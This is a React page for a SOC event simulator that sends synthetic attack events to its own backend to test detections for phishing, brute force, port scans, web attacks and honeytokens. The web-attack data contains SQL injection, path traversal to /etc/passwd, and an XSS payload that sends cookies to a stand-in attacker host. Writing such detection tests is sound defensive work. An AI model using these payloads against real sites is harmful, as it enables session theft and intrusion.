import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import {
  Terminal, ShieldAlert, KeyRound, Globe, Network,
  Send, CheckCircle, AlertTriangle, Play, Sparkles, ArrowRight
} from 'lucide-react';
import api from '../services/api';

export default function Simulator() {
  const [activeTab, setActiveTab] = useState('attack_chain');
  const [loading, setLoading] = useState(false);
  const [outputResult, setOutputResult] = useState(null);
  const [errorMsg, setErrorMsg] = useState(null);

  // Phishing state
  const [phishingUrl, setPhishingUrl] = useState('http://192.168.1.105/login/bank-verify.php');
  
  // Login state
  const [loginUsername, setLoginUsername] = useState('admin_svc');
  const [loginSourceIp, setLoginSourceIp] = useState('198.51.100.45');
  const [loginMode, setLoginMode] = useState('sequence'); // 'sequence' or 'burst'

  // Web attack state
  const [webAttackType, setWebAttackType] = useState('sqli');
  const [webSourceIp, setWebSourceIp] = useState('198.51.100.45');

  // Honeytoken state
  const [honeytokenChoice, setHoneytokenChoice] = useState('HONEYTOKEN_AWS_DEV_KEY_9921');
  const [honeySourceIp, setHoneySourceIp] = useState('198.51.100.45');

  // Port scan state
  const [scanSourceIp, setScanSourceIp] = useState('198.51.100.45');
  const [scanTargetIp, setScanTargetIp] = useState('10.0.0.15');

  const runPhishingTest = async () => {
    setLoading(true);
    setErrorMsg(null);
    setOutputResult(null);
    try {
      const res = await api.detectPhishingUrl(phishingUrl);
      setOutputResult({
        type: 'phishing',
        data: res,
        message: res.is_phishing ? 'Phishing URL detected by Random Forest model!' : 'URL evaluated as legitimate.'
      });
    } catch (err) {
      setErrorMsg(err.response?.data?.detail || err.message);
    } finally {
      setLoading(false);
    }
  };

  const runLoginSimulation = async () => {
    setLoading(true);
    setErrorMsg(null);
    setOutputResult(null);
    try {
      const runId = Math.random().toString(36).substring(2, 7);
      const results = [];
      let finalIncidentId = null;

      if (loginMode === 'sequence') {
        // 3 failed followed by 1 success
        for (let i = 1; i <= 3; i++) {
          await api.ingestEvent({
            event_id: `sim_login_f_${runId}_${i}`,
            event_type: 'login_attempt',
            source_ip: loginSourceIp,
            user_id: loginUsername,
            evidence: { status: 'failed', attempt: i }
          });
        }
        const succRes = await api.ingestEvent({
          event_id: `sim_login_s_${runId}`,
          event_type: 'login_attempt',
          source_ip: loginSourceIp,
          user_id: loginUsername,
          evidence: { status: 'success', attempt: 4 }
        });
        results.push(succRes);
        finalIncidentId = succRes.incident_id;
      } else {
        // 6 consecutive failures (burst)
        for (let i = 1; i <= 6; i++) {
          const res = await api.ingestEvent({
            event_id: `sim_burst_${runId}_${i}`,
            event_type: 'login_attempt',
            source_ip: loginSourceIp,
            user_id: loginUsername,
            evidence: { status: 'failed', attempt: i }
          });
          if (res.generated_alerts_count > 0) {
            results.push(res);
            finalIncidentId = res.incident_id;
          }
        }
      }

      setOutputResult({
        type: 'login',
        results,
        incident_id: finalIncidentId,
        message: `Login attack pattern simulated. ${results.length} alert(s) generated.`
      });
    } catch (err) {
      setErrorMsg(err.response?.data?.detail || err.message);
    } finally {
      setLoading(false);
    }
  };

  const runPortScanSimulation = async () => {
    setLoading(true);
    setErrorMsg(null);
    setOutputResult(null);
    try {
      const runId = Math.random().toString(36).substring(2, 7);
      let alertResult = null;
      // Ingest connections across 12 distinct ports
      for (let p = 1; p <= 12; p++) {
        const res = await api.ingestEvent({
          event_id: `sim_scan_${runId}_${p}`,
          event_type: 'network_connection',
          source_ip: scanSourceIp,
          target: scanTargetIp,
          evidence: { destination_ip: scanTargetIp, destination_port: 20 + p, protocol: 'TCP' }
        });
        if (res.generated_alerts_count > 0) {
          alertResult = res;
        }
      }

      setOutputResult({
        type: 'port_scan',
        data: alertResult,
        incident_id: alertResult?.incident_id,
        message: 'Port reconnaissance probe dispatched across 12 ports. Alert generated!'
      });
    } catch (err) {
      setErrorMsg(err.response?.data?.detail || err.message);
    } finally {
      setLoading(false);
    }
  };

  const runWebAttackSimulation = async () => {
    setLoading(true);
    setErrorMsg(null);
    setOutputResult(null);
    try {
      const runId = Math.random().toString(36).substring(2, 7);
      let payloadBody = '';
      let targetUri = '/api/v1/auth';

      if (webAttackType === 'sqli') {
        payloadBody = "username=admin' OR '1'='1'--&pass=x";
      } else if (webAttackType === 'xss') {
        payloadBody = "<script>document.location='http://attacker.xyz/?c='+document.cookie</script>";
        targetUri = '/comments';
      } else {
        payloadBody = 'file=../../../../etc/passwd';
        targetUri = '/download';
      }

      const res = await api.ingestEvent({
        event_id: `sim_web_${runId}`,
        event_type: 'http_request',
        source_ip: webSourceIp,
        target: targetUri,
        evidence: {
          method: 'POST',
          uri: targetUri,
          body: payloadBody,
          headers: { 'User-Agent': 'CyberSimulator/1.0' }
        }
      });

      setOutputResult({
        type: 'web_attack',
        data: res,
        incident_id: res.incident_id,
        message: `Web attack indicator dispatched (${webAttackType.toUpperCase()}). Signature matched!`
      });
    } catch (err) {
      setErrorMsg(err.response?.data?.detail || err.message);
    } finally {
      setLoading(false);
    }
  };

  const runHoneytokenSimulation = async () => {
    setLoading(true);
    setErrorMsg(null);
    setOutputResult(null);
    try {
      const runId = Math.random().toString(36).substring(2, 7);
      const res = await api.ingestEvent({
        event_id: `sim_honey_${runId}`,
        event_type: 'honeytoken_access',
        source_ip: honeySourceIp,
        user_id: 'unknown_adversary',
        target: 'production_cloud_iam',
        evidence: {
          token: honeytokenChoice,
          decoy_type: 'Canary IAM Secret',
          action: 'iam:ListUsers'
        }
      });

      setOutputResult({
        type: 'honeytoken',
        data: res,
        incident_id: res.incident_id,
        message: 'Controlled honeytoken activated. Critical deception alert generated!'
      });
    } catch (err) {
      setErrorMsg(err.response?.data?.detail || err.message);
    } finally {
      setLoading(false);
    }
  };

  const runFullCampaignSimulation = async () => {
    setLoading(true);
    setErrorMsg(null);
    setOutputResult(null);
    try {
      const runId = Math.random().toString(36).substring(2, 7);
      let lastIncId = null;
      let alertCount = 0;

      // 1. Web SQLi
      const r1 = await api.ingestEvent({
        event_id: `camp_01_${runId}`,
        event_type: 'http_request',
        source_ip: '198.51.100.45',
        target: '/api/v1/auth',
        evidence: { method: 'POST', uri: '/api/v1/auth', body: "user=admin_svc' OR '1'='1'--" }
      });
      alertCount += r1.generated_alerts_count;
      lastIncId = r1.incident_id;

      // 2. Login failures + success
      for (let i = 1; i <= 3; i++) {
        await api.ingestEvent({
          event_id: `camp_02_fail_${runId}_${i}`,
          event_type: 'login_attempt',
          source_ip: '198.51.100.45',
          user_id: 'admin_svc',
          evidence: { status: 'failed', attempt: i }
        });
      }
      const r2 = await api.ingestEvent({
        event_id: `camp_02_succ_${runId}`,
        event_type: 'login_attempt',
        source_ip: '198.51.100.45',
        user_id: 'admin_svc',
        evidence: { status: 'success', attempt: 4 }
      });
      alertCount += r2.generated_alerts_count;
      lastIncId = r2.incident_id || lastIncId;

      // 3. Honeytoken Canary Touch
      const r3 = await api.ingestEvent({
        event_id: `camp_03_honey_${runId}`,
        event_type: 'honeytoken_access',
        source_ip: '198.51.100.45',
        user_id: 'admin_svc',
        target: 'vault_cloud',
        evidence: { token: 'HONEYTOKEN_AWS_DEV_KEY_9921', decoy_type: 'AWS Canary Key' }
      });
      alertCount += r3.generated_alerts_count;
      lastIncId = r3.incident_id || lastIncId;

      setOutputResult({
        type: 'campaign',
        incident_id: lastIncId,
        alertCount,
        message: 'Multi-stage coordinated attack chain executed and correlated into a Critical incident!'
      });
    } catch (err) {
      setErrorMsg(err.response?.data?.detail || err.message);
    } finally {
      setLoading(false);
    }
  };

  const runIpRotationScenario = async () => {
    setLoading(true);
    setErrorMsg(null);
    setOutputResult(null);
    try {
      const runId = Math.random().toString(36).substring(2, 7);
      // Stage 1: Origin IP 198.51.100.45 triggers SQLi on user 'admin_svc'
      const r1 = await api.ingestEvent({
        event_id: `rot_01_${runId}`,
        event_type: 'http_request',
        source_ip: '198.51.100.45',
        user_id: 'admin_svc',
        target: '/auth',
        evidence: { method: 'POST', body: "user=admin_svc' OR '1'='1'--" }
      });

      // Stage 2: Attacker rotates to IP 203.0.113.88 and activates honeytoken with user 'admin_svc'
      const r2 = await api.ingestEvent({
        event_id: `rot_02_${runId}`,
        event_type: 'honeytoken_access',
        source_ip: '203.0.113.88',
        user_id: 'admin_svc',
        target: 'canary_role',
        evidence: { token: 'HONEYTOKEN_AWS_DEV_KEY_9921' }
      });

      setOutputResult({
        type: 'ip_rotation',
        incident_id: r2.incident_id,
        message: 'IP rotation scenario tested! Both IPs (198.51.100.45 and 203.0.113.88) linked via shared user & decoy.'
      });
    } catch (err) {
      setErrorMsg(err.response?.data?.detail || err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-6">
      {/* Header */}
      <div className="pb-2 border-b border-slate-200">
        <div className="flex items-center gap-2">
          <Terminal className="w-6 h-6 text-blue-600" />
          <h1 className="text-2xl font-bold tracking-tight text-slate-900">SOC Event Simulator & Detection Tester</h1>
        </div>
        <p className="text-sm text-slate-600 mt-1">
          Safely test individual detection modules or fire orchestrated multi-vector attack scenarios against the backend.
        </p>
        <div className="mt-2 inline-flex items-center gap-1.5 px-3 py-1 rounded-md bg-amber-50 text-amber-800 text-xs font-medium border border-amber-200">
          <AlertTriangle className="w-3.5 h-3.5 text-amber-600" />
          Non-destructive demonstration environment. No real networks or live services are accessed.
        </div>
      </div>

      {/* Tabs */}
      <div className="flex flex-wrap gap-2 border-b border-slate-200 pb-1">
        {[
          { id: 'attack_chain', label: 'Multi-Stage Campaign', icon: Sparkles },
          { id: 'ip_rotation', label: 'IP Rotation Scenario', icon: Network },
          { id: 'phishing', label: 'Phishing Detector', icon: Globe },
          { id: 'login', label: 'Login Threat', icon: KeyRound },
          { id: 'port_scan', label: 'Port Scan Recon', icon: ShieldAlert },
          { id: 'web_attack', label: 'Web Exploits', icon: Terminal },
          { id: 'honeytoken', label: 'Honeytoken / Deception', icon: ShieldAlert },
        ].map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => { setActiveTab(tab.id); setOutputResult(null); setErrorMsg(null); }}
              className={`inline-flex items-center gap-2 px-3.5 py-2 rounded-lg text-xs font-bold transition-colors ${
                activeTab === tab.id
                  ? 'bg-blue-600 text-white shadow-2xs'
                  : 'bg-white border border-slate-200 text-slate-600 hover:bg-slate-50'
              }`}
            >
              <Icon className="w-3.5 h-3.5" />
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* Main Grid: Form Left, Response Right */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-start">
        {/* Left: Input Form for Active Tab */}
        <div className="bg-white rounded-xl border border-slate-200 p-6 shadow-xs space-y-4">
          {/* Tab 1: Attack Chain */}
          {activeTab === 'attack_chain' && (
            <div className="space-y-4">
              <div>
                <h2 className="text-base font-bold text-slate-900">7-Stage Correlated Attack Chain</h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Simulates a realistic progressive intrusion: Web SQLi probe → brute force login attempts → successful login → honeytoken credential access.
                </p>
              </div>
              <div className="p-3 bg-slate-50 rounded-lg text-xs text-slate-700 space-y-1 font-mono">
                <div>1. Attacker IP: 198.51.100.45</div>
                <div>2. Target Account: admin_svc</div>
                <div>3. Decoy Activated: HONEYTOKEN_AWS_DEV_KEY_9921</div>
                <div>4. Expected Outcome: Unified Incident with Critical Risk Tier</div>
              </div>
              <button
                onClick={runFullCampaignSimulation}
                disabled={loading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-bold shadow-xs transition-colors"
              >
                <Play className="w-4 h-4" />
                {loading ? 'Executing Campaign...' : 'Launch Correlated Attack Chain'}
              </button>
            </div>
          )}

          {/* Tab 2: IP Rotation */}
          {activeTab === 'ip_rotation' && (
            <div className="space-y-4">
              <div>
                <h2 className="text-base font-bold text-slate-900">IP Rotation Evasion Scenario</h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Tests NetworkX graph correlation when an attacker changes IP from 198.51.100.45 to 203.0.113.88.
                </p>
              </div>
              <div className="p-3 bg-slate-50 rounded-lg text-xs text-slate-700 space-y-1 font-mono">
                <div>Phase 1 IP: 198.51.100.45 (SQLi targeting admin_svc)</div>
                <div>Phase 2 IP: 203.0.113.88 (Rotated IP triggers canary decoy)</div>
                <div>Correlation Factor: Shared user 'admin_svc' and shared decoy token</div>
              </div>
              <button
                onClick={runIpRotationScenario}
                disabled={loading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-bold shadow-xs transition-colors"
              >
                <Play className="w-4 h-4" />
                {loading ? 'Evaluating Scenario...' : 'Execute IP Rotation Scenario'}
              </button>
            </div>
          )}

          {/* Tab 3: Phishing URL */}
          {activeTab === 'phishing' && (
            <div className="space-y-4">
              <div>
                <h2 className="text-base font-bold text-slate-900">Phishing URL Detection</h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Analyzes URL lexical features, domain entropy, sensitive keywords, and Random Forest classifier score.
                </p>
              </div>
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">Target URL</label>
                <input
                  type="text"
                  value={phishingUrl}
                  onChange={(e) => setPhishingUrl(e.target.value)}
                  className="w-full p-2.5 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-900 font-mono"
                />
              </div>
              <div className="flex flex-wrap gap-2 text-xs">
                <button
                  type="button"
                  onClick={() => setPhishingUrl('http://192.168.1.105/login/bank-verify.php')}
                  className="px-2 py-1 bg-slate-100 hover:bg-slate-200 rounded text-slate-700 font-mono text-[11px]"
                >
                  Malicious Sample 1
                </button>
                <button
                  type="button"
                  onClick={() => setPhishingUrl('http://paypa1-account-update.xyz/login.html')}
                  className="px-2 py-1 bg-slate-100 hover:bg-slate-200 rounded text-slate-700 font-mono text-[11px]"
                >
                  Malicious Sample 2
                </button>
                <button
                  type="button"
                  onClick={() => setPhishingUrl('https://www.google.com/search?q=cybersecurity')}
                  className="px-2 py-1 bg-slate-100 hover:bg-slate-200 rounded text-slate-700 font-mono text-[11px]"
                >
                  Benign Sample
                </button>
              </div>
              <button
                onClick={runPhishingTest}
                disabled={loading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-bold transition-colors"
              >
                <Globe className="w-3.5 h-3.5" />
                {loading ? 'Evaluating Model...' : 'Classify URL'}
              </button>
            </div>
          )}

          {/* Tab 4: Login Threat */}
          {activeTab === 'login' && (
            <div className="space-y-4">
              <div>
                <h2 className="text-base font-bold text-slate-900">Login Threat Detection</h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Simulate sliding window brute force bursts or credential stuffing sequences.
                </p>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold text-slate-700 mb-1">Target Username</label>
                  <input
                    type="text"
                    value={loginUsername}
                    onChange={(e) => setLoginUsername(e.target.value)}
                    className="w-full p-2 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-900"
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-slate-700 mb-1">Attacker IP</label>
                  <input
                    type="text"
                    value={loginSourceIp}
                    onChange={(e) => setLoginSourceIp(e.target.value)}
                    className="w-full p-2 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-900"
                  />
                </div>
              </div>
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">Attack Pattern</label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => setLoginMode('sequence')}
                    className={`py-2 text-xs font-semibold rounded-lg border text-center ${
                      loginMode === 'sequence' ? 'bg-blue-50 border-blue-600 text-blue-700' : 'bg-white border-slate-200 text-slate-700'
                    }`}
                  >
                    Failures + Success
                  </button>
                  <button
                    type="button"
                    onClick={() => setLoginMode('burst')}
                    className={`py-2 text-xs font-semibold rounded-lg border text-center ${
                      loginMode === 'burst' ? 'bg-blue-50 border-blue-600 text-blue-700' : 'bg-white border-slate-200 text-slate-700'
                    }`}
                  >
                    6× Failure Burst
                  </button>
                </div>
              </div>
              <button
                onClick={runLoginSimulation}
                disabled={loading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-bold transition-colors"
              >
                <KeyRound className="w-3.5 h-3.5" />
                {loading ? 'Processing Logins...' : 'Simulate Login Attack'}
              </button>
            </div>
          )}

          {/* Tab 5: Port Scan */}
          {activeTab === 'port_scan' && (
            <div className="space-y-4">
              <div>
                <h2 className="text-base font-bold text-slate-900">Port Reconnaissance Detection</h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Simulates synthetic network connection probes hitting 12 distinct ports to test deduplication and thresholds.
                </p>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold text-slate-700 mb-1">Scanner IP</label>
                  <input
                    type="text"
                    value={scanSourceIp}
                    onChange={(e) => setScanSourceIp(e.target.value)}
                    className="w-full p-2 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-900"
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-slate-700 mb-1">Target Host</label>
                  <input
                    type="text"
                    value={scanTargetIp}
                    onChange={(e) => setScanTargetIp(e.target.value)}
                    className="w-full p-2 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-900"
                  />
                </div>
              </div>
              <button
                onClick={runPortScanSimulation}
                disabled={loading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-bold transition-colors"
              >
                <ShieldAlert className="w-3.5 h-3.5" />
                {loading ? 'Dispatching Packets...' : 'Simulate Port Scan (12 Ports)'}
              </button>
            </div>
          )}

          {/* Tab 6: Web Attack */}
          {activeTab === 'web_attack' && (
            <div className="space-y-4">
              <div>
                <h2 className="text-base font-bold text-slate-900">Web Application Attack Signatures</h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Sends simulated malicious HTTP requests containing SQL Injection, XSS, or Path Traversal payloads.
                </p>
              </div>
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">Attack Signature Type</label>
                <div className="grid grid-cols-3 gap-2">
                  {['sqli', 'xss', 'traversal'].map((type) => (
                    <button
                      type="button"
                      key={type}
                      onClick={() => setWebAttackType(type)}
                      className={`py-2 text-xs font-semibold uppercase rounded-lg border text-center ${
                        webAttackType === type ? 'bg-blue-50 border-blue-600 text-blue-700' : 'bg-white border-slate-200 text-slate-700'
                      }`}
                    >
                      {type}
                    </button>
                  ))}
                </div>
              </div>
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">Source IP</label>
                <input
                  type="text"
                  value={webSourceIp}
                  onChange={(e) => setWebSourceIp(e.target.value)}
                  className="w-full p-2 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-900"
                />
              </div>
              <button
                onClick={runWebAttackSimulation}
                disabled={loading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-bold transition-colors"
              >
                <Terminal className="w-3.5 h-3.5" />
                {loading ? 'Scanning Payload...' : 'Send Simulated Web Attack'}
              </button>
            </div>
          )}

          {/* Tab 7: Honeytoken */}
          {activeTab === 'honeytoken' && (
            <div className="space-y-4">
              <div>
                <h2 className="text-base font-bold text-slate-900">Controlled Honeytoken Deception</h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Simulate adversary discovery and invocation of decoy credentials. Masks secret values automatically.
                </p>
              </div>
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">Decoy Credential</label>
                <select
                  value={honeytokenChoice}
                  onChange={(e) => setHoneytokenChoice(e.target.value)}
                  className="w-full p-2 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-800 font-mono"
                >
                  <option value="HONEYTOKEN_AWS_DEV_KEY_9921">HONEYTOKEN_AWS_DEV_KEY_9921 (Canary IAM)</option>
                  <option value="decoy_admin_token_alpha">decoy_admin_token_alpha (API Token)</option>
                  <option value="svc_backup_decoy">svc_backup_decoy (Service Account)</option>
                  <option value="PROD_DB_SECRET_DECOY_X9">PROD_DB_SECRET_DECOY_X9 (Database String)</option>
                </select>
              </div>
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">Invoker IP</label>
                <input
                  type="text"
                  value={honeySourceIp}
                  onChange={(e) => setHoneySourceIp(e.target.value)}
                  className="w-full p-2 text-xs bg-slate-50 border border-slate-200 rounded-lg text-slate-900"
                />
              </div>
              <button
                onClick={runHoneytokenSimulation}
                disabled={loading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-bold transition-colors"
              >
                <ShieldAlert className="w-3.5 h-3.5" />
                {loading ? 'Triggering Canary...' : 'Trigger Decoy Trap'}
              </button>
            </div>
          )}
        </div>

        {/* Right: Live Execution Results */}
        <div className="bg-white rounded-xl border border-slate-200 p-6 shadow-xs space-y-4">
          <div className="flex items-center justify-between pb-3 border-b border-slate-100">
            <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
              <CheckCircle className="w-5 h-5 text-emerald-600" />
              Live Backend Response
            </h2>
            <span className="text-[11px] font-mono text-slate-500">API Contract Output</span>
          </div>

          {errorMsg && (
            <div className="p-4 bg-red-50 border border-red-200 rounded-lg text-xs text-red-800">
              <span className="font-bold block">Execution Error:</span>
              <p>{errorMsg}</p>
            </div>
          )}

          {!outputResult && !errorMsg ? (
            <div className="h-64 flex flex-col items-center justify-center text-slate-400 text-center p-6 border border-dashed border-slate-200 rounded-lg">
              <Terminal className="w-8 h-8 mb-2 text-slate-300" />
              <p className="text-xs font-medium text-slate-600">Simulator Idle</p>
              <p className="text-[11px] text-slate-400 mt-0.5">Select a module on the left and trigger a simulation to inspect live API outputs.</p>
            </div>
          ) : outputResult && (
            <div className="space-y-4">
              <div className="p-3 bg-emerald-50 border border-emerald-200 rounded-lg text-xs text-emerald-900">
                <span className="font-bold block">{outputResult.message}</span>
              </div>

              {outputResult.incident_id && (
                <div className="p-3 bg-blue-50 border border-blue-200 rounded-lg text-xs flex items-center justify-between">
                  <div>
                    <span className="font-bold text-blue-900">Correlated Incident Created:</span>
                    <span className="font-mono text-blue-700 ml-2 font-semibold">{outputResult.incident_id}</span>
                  </div>
                  <Link
                    to={`/incidents/${outputResult.incident_id}`}
                    className="inline-flex items-center gap-1 font-semibold text-blue-700 hover:text-blue-900 underline"
                  >
                    Inspect Details <ArrowRight className="w-3.5 h-3.5" />
                  </Link>
                </div>
              )}

              <div>
                <span className="text-xs font-semibold uppercase tracking-wider text-slate-600 block mb-1">
                  Payload Response
                </span>
                <pre className="p-4 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono text-slate-800 overflow-x-auto max-h-72">
                  {JSON.stringify(outputResult, null, 2)}
                </pre>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
